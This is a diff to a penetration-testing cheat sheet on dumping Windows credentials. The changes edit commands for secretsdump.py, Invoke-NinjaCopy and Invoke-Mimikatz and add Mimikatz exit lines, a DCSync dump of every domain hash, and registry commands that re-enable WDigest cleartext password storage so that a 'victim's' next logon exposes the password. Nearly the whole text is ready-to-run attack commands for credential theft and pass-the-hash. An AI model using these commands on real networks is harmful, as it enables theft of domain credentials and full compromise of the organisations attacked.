@@ -75,7 +75,7 @@ Successfully deleted 1 shadow copies.
 
 3. [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Invoke-NinjaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1):
 ```
-> Invoke-NinjaCopy -Path <ntds.dit> -ComputerName <dc_fqdn> -LocalDestination <where_to_copy>
+> Invoke-NinjaCopy -Path <ntds.dit> -ComputerName <dc> -LocalDestination <where_to_copy>
 ```
 
 ## Dumping hashes
@@ -91,12 +91,12 @@ $ python secretsdump.py -sam <sam.hive> -security <security.hive> -system <syste
 2. Online (without the hives):
 * With administrator credentials:
 ```
-$ python secretsdump.py [<domain>/]<username>:<password>@<server_fqdn>
+$ python secretsdump.py [<domain>/]<username>:<password>@<server>
 ```
 
 * By PtH (NTLM hash of an administrator account):
 ```
-$ python secretsdump.py -hashes <LM>:<NTLM> [<domain>/]<username>@<server_fqdn>
+$ python secretsdump.py -hashes <LM>:<NTLM> [<domain>/]<username>@<server>
 ```
 
 #### Domain user accounts
@@ -107,7 +107,7 @@ python secretsdump.py -ntds <ntds.dit> -system <system.hive> LOCAL
 
 2. Online (without the hives):
 ```
-$ python secretsdump.py [<domain>/]<username>[:<password> | -hashes <LM>:<NTLM>]@<dc_fqdn>
+$ python secretsdump.py [<domain>/]<username>[:<password> | -hashes <LM>:<NTLM>]@<dc>
 ```
 
 ### With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
@@ -122,6 +122,7 @@ mimikatz # lsadump::sam /system:<system.hive> /sam:<sam.hive>
 mimikatz # privilege::debug
 mimikatz # token::elevate
 mimikatz # lsadump::sam
+mimikatz # exit
 ```
 
 #### Domain user accounts
@@ -129,18 +130,42 @@ mimikatz # lsadump::sam
 ```
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
+mimikatz # exit
 ```
 
 2. From a Domain Controller:
 * LM/NTLM hashes only:
 ```
 mimikatz # lsadump::lsa /patch
+mimikatz # exit
 ```
 
 * LM/NTLM hashes + [supplementalCredentials](https://msdn.microsoft.com/de-de/library/cc245674.aspx) like WDigest and Kerberos hashes:
 ```
 mimikatz # lsadump::lsa /inject
+mimikatz # exit
 ```
+
+* With DCSync:
+```
+mimikatz # privilege::debug
+mimikatz # lsadump::dcsync /domain:test.local /all /csv
+mimikatz # exit
+```
+
+#### Tricks when there is no more cleartext passwords in memory (after KB2871997 installed)
+1. Remove the protection in registry:
+* From a Cmd prompt:
+```
+> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+```
+
+* From a Powershell session:
+```
+Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
+```
+
+2. Wait the next victim's logon or make him restart or logoff
 
 ### With Empire
 #### Local user accounts (server or workstation)
@@ -213,6 +238,6 @@ msf post(smart_hashdump) > exploit
 ### With [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/)'s [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1):
 See the Mimikatz part above and apply it within the Command argument of Invoke-Mimikatz.ps1. Example:
 ```
-> Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject" exit' -Computer <dc_fqdn>
+> Invoke-Mimikatz -Command '"privilege::debug" "lsadump::lsa /inject" exit' -Computer <dc>
 ```
 > Hints: Put the whole command sequence between single quotes and each command between double quotes and don't forget to exit!!
